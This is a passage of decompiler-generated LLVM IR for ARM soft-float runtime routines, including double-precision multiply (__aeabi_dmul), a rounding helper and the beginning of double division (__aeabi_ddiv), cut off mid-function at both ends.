  %v7_17e48 = shl i32 %v1_17e48, %v1_17e3c
  %v8_17e48 = or i32 %v7_17e48, %v6_17e44
  %v6_17e4c = lshr i32 %v1_17e48, %v5_17e38
  %v0_17e50 = load i32, i32* %r4.global-to-local, align 4
  %v2_17e50 = add i32 %v0_17e50, %v5_17e38
  store i32 %v2_17e50, i32* @r4, align 4
  %v4_17e54 = sext i32 %v8_17e48 to i64
  %v5_17e54 = call i32 @function_17b38(i64 %v4_17e54, i32 %v6_17e4c, i32 %v5_17e38, i32 %v1_17e3c)
  ret i32 %v5_17e54

; uselistorder directives
  uselistorder i32 %v5_17e38, { 2, 0, 1, 3, 4 }
  uselistorder label %bb5, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__aeabi_dmul(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = sext i32 %arg3 to i64
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp32 = trunc i64 %arg1 to i32
  store i32 %tmp32, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_17e58 = load i32, i32* @r4, align 4
  store i32 %v3_17e58, i32* %stack_var_-16, align 4
  %v12_17e58 = load i32, i32* @lr, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v4_17e64 = udiv i32 %arg2, 1048576
  %v5_17e64 = urem i32 %v4_17e64, 2048
  store i32 %v5_17e64, i32* %r4.global-to-local, align 4
  %v6_17e64 = icmp eq i32 %v5_17e64, 0
  br i1 %v6_17e64, label %.thread2, label %bb

bb:                                               ; preds = %entry
  %v5_17e68 = udiv i32 %arg4, 1048576
  %v6_17e68 = urem i32 %v5_17e68, 2048
  store i32 %v6_17e68, i32* @r5, align 4
  %v7_17e68 = icmp eq i32 %v6_17e68, 0
  br i1 %v7_17e68, label %.thread2, label %bb38

bb38:                                             ; preds = %bb
  %v5_17e6c = icmp eq i32 %v5_17e64, 2047
  br i1 %v5_17e6c, label %.thread2, label %bb39

bb39:                                             ; preds = %bb38
  %v5_17e70 = icmp eq i32 %v6_17e68, 2047
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb, %bb38, %bb39
  %v0_17e74 = phi i1 [ true, %bb ], [ true, %bb38 ], [ %v5_17e70, %bb39 ], [ true, %entry ]
  store i32 ptrtoint (i32* @global_var_17e78.960 to i32), i32* %lr.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %v0_17e74, i32 ptrtoint (i32* @global_var_18050.958 to i32))
  %v0_17e78 = load i32, i32* %r4.global-to-local, align 4
  %v1_17e78 = load i32, i32* @r5, align 4
  %v2_17e78 = add i32 %v1_17e78, %v0_17e78
  store i32 %v2_17e78, i32* %r4.global-to-local, align 4
  %v2_17e7c = xor i32 %arg4, %arg2
  %v1_17e80 = load i32, i32* %ip.global-to-local, align 4
  %tmp51 = mul i32 %v1_17e80, -2097152
  %v5_17e80 = add i32 %tmp51, -1
  %v6_17e80 = and i32 %v5_17e80, %arg2
  store i32 %v6_17e80, i32* %r1.global-to-local, align 4
  %v6_17e84 = and i32 %v5_17e80, %arg4
  %v5_17e88 = mul i32 %arg2, 4096
  %v6_17e88 = or i32 %v5_17e88, %tmp32
  %v8_17e88 = icmp eq i32 %v6_17e88, 0
  br i1 %v8_17e88, label %.thread3, label %bb40

.thread3:                                         ; preds = %.thread2
  %v1_17e905 = or i32 %v6_17e80, 1048576
  store i32 %v1_17e905, i32* %r1.global-to-local, align 4
  %v1_17e947 = or i32 %v6_17e84, 1048576
  br label %dec_label_pc_17f14

bb40:                                             ; preds = %.thread2
  %v6_17e8c = mul i32 %arg4, 4096
  %v7_17e8c = or i32 %v6_17e8c, %arg3
  %v9_17e8c = icmp eq i32 %v7_17e8c, 0
  %v1_17e90 = or i32 %v6_17e80, 1048576
  store i32 %v1_17e90, i32* %r1.global-to-local, align 4
  %v1_17e94 = or i32 %v6_17e84, 1048576
  br i1 %v9_17e8c, label %dec_label_pc_17f14, label %dec_label_pc_17e9c

dec_label_pc_17e9c:                               ; preds = %bb40
  %v6_17e9c = mul nuw i64 %tmp, %arg1
  %v7_17e9c = udiv i64 %v6_17e9c, 4294967296
  %v9_17e9c = trunc i64 %v6_17e9c to i32
  store i32 %v9_17e9c, i32* %ip.global-to-local, align 4
  %v7_17ea4 = zext i32 %v1_17e90 to i64
  %v11_17ea4 = mul nuw nsw i64 %v7_17ea4, %tmp
  %v12_17ea4 = add i64 %v11_17ea4, %v7_17e9c
  %v1_17ea8 = and i32 %v2_17e7c, -2147483648
  %v10_17eac = zext i32 %v1_17e94 to i64
  %v11_17eac = mul nuw i64 %v10_17eac, %arg1
  %v12_17eac = add i64 %v12_17ea4, %v11_17eac
  %v13_17eac = udiv i64 %v12_17eac, 4294967296
  %v15_17eac = trunc i64 %v12_17eac to i32
  %v10_17eb4 = mul nuw i64 %v10_17eac, %v7_17ea4
  %v11_17eb4 = add i64 %v13_17eac, %v10_17eb4
  %v12_17eb4 = udiv i64 %v11_17eb4, 4294967296
  %v13_17eb4 = trunc i64 %v12_17eb4 to i32
  %v14_17eb4 = trunc i64 %v11_17eb4 to i32
  %v2_17eb8 = icmp eq i32 %v9_17e9c, 0
  br i1 %v2_17eb8, label %bb42, label %bb41

bb41:                                             ; preds = %dec_label_pc_17e9c
  %v2_17ebc = or i32 %v15_17eac, 1
  br label %bb42

bb42:                                             ; preds = %dec_label_pc_17e9c, %bb41
  %storemerge = phi i32 [ %v2_17ebc, %bb41 ], [ %v15_17eac, %dec_label_pc_17e9c ]
  %v0_17ed0 = phi i32 [ %v2_17ebc, %bb41 ], [ %v15_17eac, %dec_label_pc_17e9c ]
  store i32 %storemerge, i32* %lr.global-to-local, align 4
  %v1_17ec0 = add i32 %v2_17e78, -255
  %v2_17ec4 = icmp ugt i32 %v13_17eb4, 511
  %v2_17ec8 = icmp eq i1 %v2_17ec4, false
  %v3_17ec8 = add i32 %v2_17e78, -1023
  %v5_17ec8 = sext i1 %v2_17ec8 to i32
  %v6_17ec8 = add i32 %v3_17ec8, %v5_17ec8
  store i32 %v6_17ec8, i32* %r4.global-to-local, align 4
  %v3_17ecc = icmp ugt i32 %v1_17ec0, 768
  br i1 %v3_17ecc, label %dec_label_pc_17edc, label %dec_label_pc_17ed0

dec_label_pc_17ed0:                               ; preds = %bb42
  %v1_17ed0 = icmp slt i32 %v0_17ed0, 0
  %v2_17ed0 = mul i32 %v0_17ed0, 2
  store i32 %v2_17ed0, i32* %lr.global-to-local, align 4
  %v3_17ed4 = mul i32 %v14_17eb4, 2
  %v4_17ed4 = zext i1 %v1_17ed0 to i32
  %v5_17ed4 = or i32 %v4_17ed4, %v3_17ed4
  %v9_17ed4 = icmp ule i32 %v5_17ed4, %v14_17eb4
  %v10_17ed4 = icmp ult i32 %v3_17ed4, %v14_17eb4
  %v11_17ed4 = select i1 %v1_17ed0, i1 %v9_17ed4, i1 %v10_17ed4
  %v3_17ed825 = mul nuw nsw i64 %v12_17eb4, 2
  %v3_17ed8 = trunc i64 %v3_17ed825 to i32
  %v4_17ed8 = zext i1 %v11_17ed4 to i32
  %v5_17ed8 = or i32 %v4_17ed8, %v3_17ed8
  br label %dec_label_pc_17edc

dec_label_pc_17edc:                               ; preds = %bb42, %dec_label_pc_17ed0
  %v0_17eec = phi i32 [ %v0_17ed0, %bb42 ], [ %v2_17ed0, %dec_label_pc_17ed0 ]
  %v0_17ee4 = phi i32 [ %v14_17eb4, %bb42 ], [ %v5_17ed4, %dec_label_pc_17ed0 ]
  %v1_17edc = phi i32 [ %v13_17eb4, %bb42 ], [ %v5_17ed8, %dec_label_pc_17ed0 ]
  %v4_17edc = mul i32 %v1_17edc, 2048
  %v4_17ee0 = udiv i32 %v0_17ee4, 2097152
  %v5_17edc = or i32 %v4_17ee0, %v1_17ea8
  %v5_17ee0 = or i32 %v5_17edc, %v4_17edc
  store i32 %v5_17ee0, i32* %r1.global-to-local, align 4
  %v3_17ee4 = mul i32 %v0_17ee4, 2048
  %v4_17ee8 = udiv i32 %v0_17eec, 2097152
  %v5_17ee8 = or i32 %v3_17ee4, %v4_17ee8
  store i32 %v5_17ee8, i32* %r0.global-to-local, align 4
  %v3_17eec = mul i32 %v0_17eec, 2048
  store i32 %v3_17eec, i32* %lr.global-to-local, align 4
  %v1_17ef0 = add i32 %v6_17ec8, -253
  store i32 %v1_17ef0, i32* %ip.global-to-local, align 4
  %v2_17ef0 = icmp ugt i32 %v6_17ec8, 252
  %v7_17ef0 = icmp eq i32 %v6_17ec8, 253
  %v2_17ef4 = xor i1 %v7_17ef0, true
  %v3_17ef4 = and i1 %v2_17ef0, %v2_17ef4
  br i1 %v3_17ef4, label %bb43, label %bb44

bb43:                                             ; preds = %dec_label_pc_17edc
  %v6_17ef4 = icmp ugt i32 %v1_17ef0, 1791
  %v11_17ef4 = icmp eq i32 %v1_17ef0, 1792
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_17edc, %bb43
  %v1_17ef8 = phi i1 [ %v7_17ef0, %dec_label_pc_17edc ], [ %v11_17ef4, %bb43 ]
  %v0_17ef8 = phi i1 [ %v2_17ef0, %dec_label_pc_17edc ], [ %v6_17ef4, %bb43 ]
  %v2_17ef8 = xor i1 %v1_17ef8, true
  %v3_17ef8 = and i1 %v0_17ef8, %v2_17ef8
  call void @__pseudo_cond_branch(i1 %v3_17ef8, i32 ptrtoint (i32* @global_var_17f44.959 to i32))
  %v0_17efc = load i32, i32* %lr.global-to-local, align 4
  %v2_17efc = icmp slt i32 %v0_17efc, 0
  %v6_17efc = icmp eq i32 %v0_17efc, -2147483648
  %v1_17f00 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v6_17efc, label %bb45, label %._crit_edge

bb45:                                             ; preds = %bb44
  %v2_17f00 = urem i32 %v1_17f00, 2
  %v3_17f00 = icmp ne i32 %v2_17f00, 0
  %v4_17f00 = udiv i32 %v1_17f00, 2
  store i32 %v4_17f00, i32* %lr.global-to-local, align 4
  br label %._crit_edge

._crit_edge:                                      ; preds = %bb44, %bb45
  %v1_17f04 = phi i1 [ %v3_17f00, %bb45 ], [ %v2_17efc, %bb44 ]
  %v2_17f04 = zext i1 %v1_17f04 to i32
  %v3_17f04 = add i32 %v2_17f04, %v1_17f00
  store i32 %v3_17f04, i32* %r0.global-to-local, align 4
  %v0_17f08 = load i32, i32* %r1.global-to-local, align 4
  %v1_17f08 = load i32, i32* %r4.global-to-local, align 4
  %v2_17f08 = and i32 %v1_17f08, 4096
  %v3_17f08 = icmp ne i32 %v2_17f08, 0
  %v4_17f08 = mul i32 %v1_17f08, 1048576
  %v6_17f08 = add i32 %v4_17f08, %v0_17f08
  %v7_17f08 = zext i1 %v3_17f08 to i32
  %v8_17f08 = add i32 %v7_17f08, %v6_17f08
  store i32 %v8_17f08, i32* %r1.global-to-local, align 4
  %v2_17f0c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17f0c, i32* %r4.global-to-local, align 4
  store i32 %v12_17e58, i32* %lr.global-to-local, align 4
  ret i32 %v3_17f04

dec_label_pc_17f14:                               ; preds = %.thread3, %bb40
  %v1_17f20 = phi i32 [ %v1_17e947, %.thread3 ], [ %v1_17e94, %bb40 ]
  %v1_17f18 = phi i32 [ %v1_17e905, %.thread3 ], [ %v1_17e90, %bb40 ]
  %v1_17f14 = and i32 %v2_17e7c, -2147483648
  %v2_17f18 = or i32 %v1_17f18, %v1_17f14
  %v4_17f1c1 = or i64 %tmp, %arg1
  %v4_17f1c = trunc i64 %v4_17f1c1 to i32
  store i32 %v4_17f1c, i32* %r0.global-to-local, align 4
  %v2_17f20 = xor i32 %v2_17f18, %v1_17f20
  store i32 %v2_17f20, i32* %r1.global-to-local, align 4
  %v4_17f24 = udiv i32 %v1_17e80, 2
  %v5_17f24 = sub i32 %v2_17e78, %v4_17f24
  store i32 %v5_17f24, i32* %r4.global-to-local, align 4
  %v7_17f24 = sub i32 0, %v5_17f24
  %v8_17f24 = and i32 %v2_17e78, %v7_17f24
  %v11_17f24 = icmp eq i32 %v2_17e78, %v4_17f24
  %v7_17f28 = icmp sgt i32 %v2_17e78, %v4_17f24
  br i1 %v7_17f28, label %bb46, label %bb47

bb46:                                             ; preds = %dec_label_pc_17f14
  %v10_17f28 = sub i32 %v1_17e80, %v5_17f24
  %v12_17f28 = xor i32 %v5_17f24, %v1_17e80
  %v13_17f28 = xor i32 %v10_17f28, %v1_17e80
  %v14_17f28 = and i32 %v13_17f28, %v12_17f28
  %v17_17f28 = icmp eq i32 %v1_17e80, %v5_17f24
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_17f14, %bb46
  %v3_17f34.in = phi i32 [ %v8_17f24, %dec_label_pc_17f14 ], [ %v14_17f28, %bb46 ]
  %v2_17f34.in = phi i32 [ %v5_17f24, %dec_label_pc_17f14 ], [ %v10_17f28, %bb46 ]
  %v1_17f34 = phi i1 [ %v11_17f24, %dec_label_pc_17f14 ], [ %v17_17f28, %bb46 ]
  %v2_17f34 = icmp slt i32 %v2_17f34.in, 0
  %v3_17f34 = icmp slt i32 %v3_17f34.in, 0
  %v3_17f2c = xor i1 %v3_17f34, %v2_17f34
  %v4_17f2c = or i1 %v1_17f34, %v3_17f2c
  br i1 %v4_17f2c, label %._crit_edge23, label %bb48

._crit_edge23:                                    ; preds = %bb47
  %v0_17f34.pre = load i32, i32* %lr.global-to-local, align 4
  br label %bb49

bb48:                                             ; preds = %bb47
  %v9_17f2c30 = mul i32 %v5_17f24, 1048576
  %v10_17f2c31 = or i32 %v2_17f20, %v9_17f2c30
  store i32 %v10_17f2c31, i32* %r1.global-to-local, align 4
  %v7_17f30 = load i32, i32* %stack_var_-16, align 4
  store i32 %v7_17f30, i32* %r4.global-to-local, align 4
  store i32 %v12_17e58, i32* %lr.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %._crit_edge23, %bb48
  %v0_17f34 = phi i32 [ %v0_17f34.pre, %._crit_edge23 ], [ %v12_17e58, %bb48 ]
  %v6_17f34 = xor i1 %v4_17f2c, true
  call void @__pseudo_cond_branch(i1 %v6_17f34, i32 %v0_17f34)
  %v0_17f38 = load i32, i32* %r1.global-to-local, align 4
  %v1_17f38 = or i32 %v0_17f38, 1048576
  store i32 %v1_17f38, i32* %r1.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v0_17f40 = load i32, i32* %r4.global-to-local, align 4
  %v1_17f40 = add i32 %v0_17f40, -1
  store i32 %v1_17f40, i32* %r4.global-to-local, align 4
  ret i32 %v4_17f1c

; uselistorder directives
  uselistorder i32 %v5_17f24, { 1, 0, 5, 3, 4, 2, 6 }
  uselistorder i32 %v4_17f24, { 2, 1, 0 }
  uselistorder i32 %v1_17f00, { 2, 0, 1 }
  uselistorder i32 %v0_17efc, { 1, 0 }
  uselistorder i1 %v7_17ef0, { 1, 0 }
  uselistorder i32 %v2_17ed0, { 1, 0 }
  uselistorder i1 %v1_17ed0, { 1, 0 }
  uselistorder i32 %v6_17ec8, { 0, 2, 1, 3 }
  uselistorder i32 %v0_17ed0, { 1, 0, 2 }
  uselistorder i32 %v14_17eb4, { 1, 3, 2, 0 }
  uselistorder i64 %v11_17eb4, { 1, 0 }
  uselistorder i64 %v12_17eac, { 1, 0 }
  uselistorder i64 %v10_17eac, { 1, 0 }
  uselistorder i64 %v7_17ea4, { 1, 0 }
  uselistorder i64 %v6_17e9c, { 1, 0 }
  uselistorder i32 %v6_17e84, { 1, 0 }
  uselistorder i32 %v6_17e80, { 1, 0, 2 }
  uselistorder i32 %v1_17e80, { 5, 2, 3, 4, 1, 0 }
  uselistorder i32 %v2_17e78, { 4, 3, 0, 2, 1, 5, 6 }
  uselistorder i32 %v6_17e68, { 2, 1, 0 }
  uselistorder i32 %v5_17e64, { 2, 1, 0 }
  uselistorder i32 %v12_17e58, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 1, 4, 5, 6, 7, 8, 10, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 0, 9 }
  uselistorder i32 %arg4, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 2, 3, 1, 4 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_17f14, { 1, 0 }
  uselistorder label %._crit_edge, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %dec_label_pc_17edc, { 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %.thread2, { 3, 2, 1, 0 }
}

define i32 @function_17f44() local_unnamed_addr {
dec_label_pc_17f44:
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_16 = alloca i32, align 4
  %v0_17f44 = load i1, i1* @cpsr_z, align 1
  %v1_17f44 = load i1, i1* @cpsr_n, align 1
  %v2_17f44 = load i1, i1* @cpsr_v, align 1
  %v3_17f44 = xor i1 %v1_17f44, %v2_17f44
  %v4_17f44 = or i1 %v0_17f44, %v3_17f44
  br i1 %v4_17f44, label %dec_label_pc_17f48, label %dec_label_pc_180c0

dec_label_pc_17f48:                               ; preds = %dec_label_pc_17f44
  %v0_17f48 = load i32, i32* @r4, align 4
  %v4_17f48 = add i32 %v0_17f48, 54
  %v6_17f48 = sub i32 0, %v0_17f48
  %v7_17f48 = and i32 %v4_17f48, %v6_17f48
  %v8_17f48 = icmp slt i32 %v7_17f48, 0
  %v9_17f48 = icmp slt i32 %v4_17f48, 0
  %v10_17f48 = icmp eq i32 %v4_17f48, 0
  %v7_17f4c = icmp sgt i32 %v0_17f48, -54
  br i1 %v7_17f4c, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_17f48
  store i32 0, i32* @r0, align 4
  %v8_17f50 = load i32, i32* @r1, align 4
  %v9_17f50 = and i32 %v8_17f50, -2147483648
  store i32 %v9_17f50, i32* @r1, align 4
  store i32 %tmp10, i32* @r4, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_17f48, %bb
  %v4_17f58 = xor i1 %v9_17f48, %v8_17f48
  %v5_17f58 = or i1 %v10_17f48, %v4_17f58
  call void @__pseudo_cond_branch(i1 %v5_17f58, i32 %tmp7)
  %v0_17f5c = load i32, i32* @r4, align 4
  %v1_17f5c = sub i32 0, %v0_17f5c
  %v2_17f60 = sub i32 -32, %v0_17f5c
  %v4_17f60 = add i32 %v0_17f5c, 31
  %v5_17f60 = and i32 %v4_17f60, %v1_17f5c
  %v6_17f60 = icmp slt i32 %v5_17f60, 0
  store i1 %v6_17f60, i1* @cpsr_v, align 1
  %v6_17f64 = icmp slt i32 %v1_17f5c, 32
  br i1 %v6_17f64, label %dec_label_pc_17f68, label %dec_label_pc_17fd4

dec_label_pc_17f68:                               ; preds = %.thread1
  %v1_17f68 = add i32 %v2_17f60, 12
  %v8_17f6c = icmp sgt i32 %v1_17f68, 0
  br i1 %v8_17f6c, label %dec_label_pc_17fa4, label %dec_label_pc_17f70

dec_label_pc_17f70:                               ; preds = %dec_label_pc_17f68
  %v1_17f70 = add i32 %v2_17f60, 32
  %v1_17f74 = sub i32 0, %v2_17f60
  %v0_17f78 = load i32, i32* @r0, align 4
  %v6_17f78 = shl i32 %v0_17f78, %v1_17f74
  %v2_17f7c = add i32 %v2_17f60, 31
  %v3_17f7c = shl i32 1, %v2_17f7c
  %v6_17f7c = lshr i32 %v0_17f78, %v1_17f70
  %v1_17f80 = load i32, i32* @r1, align 4
  %v7_17f80 = shl i32 %v1_17f80, %v1_17f74
  %v8_17f80 = or i32 %v7_17f80, %v6_17f7c
  %v1_17f84 = and i32 %v1_17f80, -2147483648
  %tmp = bitcast i32 %v1_17f80 to float
  %tmp19 = call float @fabsf(float %tmp)
  %v1_17f88 = bitcast float %tmp19 to i32
  %tmp20 = icmp slt i32 %v6_17f78, 0
  %v4_17f8c = zext i1 %tmp20 to i32
  %v5_17f8c = add i32 %v8_17f80, %v4_17f8c
  %v5_17f90 = and i32 %v1_17f88, %v3_17f7c
  %v6_17f90 = icmp ne i32 %v5_17f90, 0
  %v7_17f90 = lshr i32 %v1_17f88, %v1_17f70
  %v9_17f90 = add i32 %v7_17f90, %v1_17f84
  %v10_17f90 = zext i1 %v6_17f90 to i32
  %v11_17f90 = add i32 %v9_17f90, %v10_17f90
  store i32 %v11_17f90, i32* @r1, align 4
  %v19_17f90 = add i32 %v11_17f90, %v10_17f90
  %v20_17f90 = xor i32 %v19_17f90, %v1_17f80
  %v21_17f90 = xor i32 %v19_17f90, %v7_17f90
  %v22_17f90 = and i32 %v20_17f90, %v21_17f90
  %v23_17f90 = icmp slt i32 %v22_17f90, 0
  store i1 %v23_17f90, i1* @cpsr_v, align 1
  %v3_17f94 = mul i32 %v6_17f78, 2
  %v4_17f94 = or i32 %v3_17f94, %tmp7
  %v5_17f94 = icmp slt i32 %v4_17f94, 0
  store i1 %v5_17f94, i1* @cpsr_n, align 1
  %v6_17f94 = icmp eq i32 %v4_17f94, 0
  store i1 %v6_17f94, i1* @cpsr_z, align 1
  br i1 %v6_17f94, label %bb13, label %bb14

bb13:                                             ; preds = %dec_label_pc_17f70
  %tmp21 = sext i1 %tmp20 to i32
  %v6_17f98 = add nsw i32 %tmp21, -1
  %v7_17f98 = and i32 %v5_17f8c, %v6_17f98
  br label %bb14

bb14:                                             ; preds = %dec_label_pc_17f70, %bb13
  %v1_17fa0 = phi i32 [ %v5_17f8c, %dec_label_pc_17f70 ], [ %v7_17f98, %bb13 ]
  %v2_17f9c = load i32, i32* %stack_var_16, align 4
  store i32 %v2_17f9c, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_17fa0

dec_label_pc_17fa4:                               ; preds = %dec_label_pc_17f68
  %v1_17fa4 = sub i32 0, %v2_17f60
  %v1_17fa8 = add i32 %v2_17f60, 32
  %v0_17fac = load i32, i32* @r0, align 4
  %v6_17fac = shl i32 %v0_17fac, %v1_17fa4
  %v6_17fb0 = lshr i32 %v0_17fac, %v1_17fa8
  %v1_17fb4 = load i32, i32* @r1, align 4
  %v7_17fb4 = shl i32 %v1_17fb4, %v1_17fa4
  %v8_17fb4 = or i32 %v7_17fb4, %v6_17fb0
  %v1_17fb8 = and i32 %v1_17fb4, -2147483648
  %tmp22 = icmp slt i32 %v6_17fac, 0
  %v4_17fbc = zext i1 %tmp22 to i32
  %v5_17fbc = add i32 %v8_17fb4, %v4_17fbc
  %v6_17fbc = icmp ult i32 %v5_17fbc, %v8_17fb4
  %v2_17fc0 = zext i1 %v6_17fbc to i32
  %v3_17fc0 = or i32 %v2_17fc0, %v1_17fb8
  store i32 %v3_17fc0, i32* @r1, align 4
  %v9_17fc0 = add nsw i32 %v3_17fc0, %v2_17fc0
  %v10_17fc0 = sub i32 0, %v1_17fb4
  %v11_17fc0 = and i32 %v9_17fc0, %v10_17fc0
  %v12_17fc0 = icmp slt i32 %v11_17fc0, 0
  store i1 %v12_17fc0, i1* @cpsr_v, align 1
  %v3_17fc4 = mul i32 %v6_17fac, 2
  %v4_17fc4 = or i32 %v3_17fc4, %tmp7
  %v5_17fc4 = icmp slt i32 %v4_17fc4, 0
  store i1 %v5_17fc4, i1* @cpsr_n, align 1
  %v6_17fc4 = icmp eq i32 %v4_17fc4, 0
  store i1 %v6_17fc4, i1* @cpsr_z, align 1
  br i1 %v6_17fc4, label %bb15, label %bb16

bb15:                                             ; preds = %dec_label_pc_17fa4
  %tmp23 = sext i1 %tmp22 to i32
  %v6_17fc8 = add nsw i32 %tmp23, -1
  %v7_17fc8 = and i32 %v5_17fbc, %v6_17fc8
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_17fa4, %bb15
  %v1_17fd0 = phi i32 [ %v5_17fbc, %dec_label_pc_17fa4 ], [ %v7_17fc8, %bb15 ]
  %v2_17fcc = load i32, i32* %stack_var_16, align 4
  store i32 %v2_17fcc, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_17fd0

dec_label_pc_17fd4:                               ; preds = %.thread1
  %v1_17fd4 = sub i32 32, %v2_17f60
  %v1_17fd8 = load i32, i32* @r0, align 4
  %v7_17fd8 = shl i32 %v1_17fd8, %v1_17fd4
  %v8_17fd8 = or i32 %v7_17fd8, %tmp7
  %v6_17fdc = lshr i32 %v1_17fd8, %v2_17f60
  %v1_17fe0 = load i32, i32* @r1, align 4
  %v7_17fe0 = shl i32 %v1_17fe0, %v1_17fd4
  %v8_17fe0 = or i32 %v7_17fe0, %v6_17fdc
  %v6_17fe4 = lshr i32 %v1_17fe0, %v2_17f60
  %v1_17fe8 = and i32 %v1_17fe0, -2147483648
  store i32 %v1_17fe8, i32* @r1, align 4
  %v7_17fec = lshr i32 %v1_17fe8, %v2_17f60
  %v8_17fec = sub i32 -1, %v7_17fec
  %v9_17fec = and i32 %v6_17fe4, %v8_17fec
  %tmp24 = icmp slt i32 %v8_17fe0, 0
  %v4_17ff0 = zext i1 %tmp24 to i32
  %v5_17ff0 = add i32 %v4_17ff0, %v9_17fec
  %v3_17ff4 = mul i32 %v8_17fe0, 2
  %v4_17ff4 = or i32 %v8_17fd8, %v3_17ff4
  %v5_17ff4 = icmp slt i32 %v4_17ff4, 0
  store i1 %v5_17ff4, i1* @cpsr_n, align 1
  %v6_17ff4 = icmp eq i32 %v4_17ff4, 0
  store i1 %v6_17ff4, i1* @cpsr_z, align 1
  br i1 %v6_17ff4, label %bb17, label %bb18

bb17:                                             ; preds = %dec_label_pc_17fd4
  %tmp25 = sext i1 %tmp24 to i32
  %v6_17ff8 = add nsw i32 %tmp25, -1
  %v7_17ff8 = and i32 %v5_17ff0, %v6_17ff8
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_17fd4, %bb17
  %v1_18000 = phi i32 [ %v5_17ff0, %dec_label_pc_17fd4 ], [ %v7_17ff8, %bb17 ]
  %v2_17ffc = load i32, i32* %stack_var_16, align 4
  store i32 %v2_17ffc, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_18000

dec_label_pc_180c0:                               ; preds = %dec_label_pc_17f44
  %v0_180c0 = load i32, i32* @r1, align 4
  %v1_180c0 = and i32 %v0_180c0, -2147483648
  %v1_180c8 = or i32 %v1_180c0, 2146435072
  store i32 %v1_180c8, i32* @r1, align 4
  store i32 %tmp10, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v5_17ff0, { 1, 0 }
  uselistorder i32 %v5_17fbc, { 1, 0, 2 }
  uselistorder i32 %v8_17fb4, { 1, 0 }
  uselistorder i32 %v1_17fa4, { 1, 0 }
  uselistorder i32 %v5_17f8c, { 1, 0 }
  uselistorder i32 %v1_17f80, { 1, 0, 2, 3 }
  uselistorder i32 %v1_17f74, { 1, 0 }
  uselistorder i32 %v2_17f60, { 5, 6, 7, 9, 0, 1, 2, 3, 4, 8 }
  uselistorder i32 %v1_17f5c, { 1, 0 }
  uselistorder i32 %v4_17f48, { 1, 2, 0 }
  uselistorder i32 %v0_17f48, { 1, 0, 2 }
  uselistorder i32 %tmp10, { 1, 0 }
  uselistorder i32 %tmp6, { 2, 1, 0 }
  uselistorder i32 %tmp5, { 2, 1, 0 }
  uselistorder i32 -32, { 4, 3, 5, 6, 7, 11, 8, 12, 13, 9, 2, 10, 0, 1, 14 }
  uselistorder i32 54, { 2, 0, 1 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_180d8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_180d8:
  %v1_180dc = or i32 %arg1, 2146959360
  store i32 %v1_180dc, i32* @r1, align 4
  %v1_180e4 = load i32, i32* @r0, align 4
  ret i32 %v1_180e4
}

define i32 @__aeabi_ddiv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_180e8 = load i32, i32* @r4, align 4
  store i32 %v3_180e8, i32* %stack_var_-16, align 4
  %v6_180e8 = load i32, i32* @r5, align 4
  %v9_180e8 = load i32, i32* @r6, align 4
  %v12_180e8 = load i32, i32* @lr, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v1_180f4 = load i32, i32* @r1, align 4
  %v4_180f4 = udiv i32 %v1_180f4, 1048576
  %v5_180f4 = urem i32 %v4_180f4, 2048
  store i32 %v5_180f4, i32* @r4, align 4
